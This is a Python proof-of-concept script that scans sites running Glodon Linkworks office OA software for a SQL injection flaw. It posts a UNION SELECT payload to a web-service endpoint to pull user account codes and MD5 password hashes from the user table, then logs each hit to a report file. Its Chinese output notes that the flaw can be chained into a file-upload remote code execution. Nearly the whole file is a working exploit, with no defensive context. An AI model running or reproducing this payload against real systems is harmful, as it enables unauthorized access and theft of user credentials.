import requests
import time

import buter
import wirtefile

filename = "./reps/广联达Linkworks办公OASQL注入-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type" :"application/x-www-form-urlencoded"
    }
poc = '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
data = "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
def gloasql(url):
    try:
        rep = requests.post(url + poc, headers=headers, data=data, verify=False, timeout=3)
        if rep.status_code == 200 and "value" in rep.text:
            print(buter.colors.GREEN + f"存在广联达Linkworks办公OASQL注入 url : {url}  可进行再利用后台文件上传RCE "  + buter.colors.END)
            reptext =url+  " --> " + rep.text[rep.text.find("value"):-1].replace("&gt;&lt;/result&gt;</string", " ")
            print(reptext)
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED + f"未发现广联达Linkworks办公OASQL注入 url : {url}"+ buter.colors.END)
    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}")
